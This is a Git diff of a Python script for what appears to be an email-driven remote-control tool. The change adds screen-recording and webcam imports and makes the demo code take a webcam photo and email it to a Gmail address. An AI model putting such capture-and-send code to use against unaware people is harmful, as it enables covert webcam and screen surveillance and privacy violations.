@@ -1,9 +1,11 @@
+from urllib import response
 from mail_service import MailService
 
 import threading
 import time
 import datetime
-from services.screen import screen_shot
+from services.screen import screen_record, screen_shot
+from services.webcam import webcam_record, webcam_shot
 
 from utils import *
 from constants import *
@@ -96,13 +98,25 @@ def main():
         # html = show_tree('C:\\Users\\Admin\\Downloads\demo1')
         # request = 'TREE C:\\Users\\Admin\\Downloads\demo1'
 
-        data, msg = screen_shot()
-        request = 'SCREEN get image'
+        # status, data, msg = screen_shot()
+        # request = 'SCREEN get image'
 
-        content = html_mail(request, msg)
-        print(imghdr.what(None, data[1]))
+        # status, data, msg = screen_record(10)
+        # request = 'SCREEN get video 10'
 
-        mail = build_email_content(REMOTE_MAIL, ['bot.remote.2@gmail.com'], 'Demo PNG attachment', content, data = data)
+        # status, data, msg = webcam_record(10)
+        # request = 'WEBCAM get video 10'
+
+        result = webcam_shot()
+        request = 'WEBCAM get image'
+
+        # print(imghdr.what(None, result['data'][1]))
+
+        content = {
+            'html': html_mail(request, result['html']),
+            'data': result['data']
+        }
+        mail = build_email_content(REMOTE_MAIL, ['bot.remote.2@gmail.com'], 'Demo WEBCAM capture attachment', content)
         host_mail.send_mail(mail)
     except Exception as e:
         print_color('Error while sending mail: ' + str(e), text_format.FAIL)
@@ -133,3 +147,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+
